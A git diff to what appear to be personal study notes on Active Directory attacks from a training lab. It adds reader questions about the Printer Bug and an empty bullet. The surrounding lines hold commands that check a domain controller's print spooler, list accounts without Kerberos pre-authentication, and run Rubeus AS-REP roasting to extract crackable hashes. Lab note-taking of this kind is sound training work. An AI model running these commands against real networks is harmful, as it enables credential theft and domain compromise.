@@ -339,6 +339,9 @@ Restart-Service WinRM
 **Exchange Related Group Organization Management** 
 - Vectors for privilege escalation
 **Printer Bug**
+>[!NOTE]
+> What hardware or windows versions is this likely to be successful against?
+> Should misconfigurations be checked first or last? 
   ```
   Import-Module .\SecurityAssessment.ps1
   Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
@@ -354,6 +357,7 @@ Restart-Service WinRM
 ```
 **ASREPROasting**
 - Possible for accounts that do not have require kerberos pre-authentication enabled
+- 
 ```
 Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
 .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
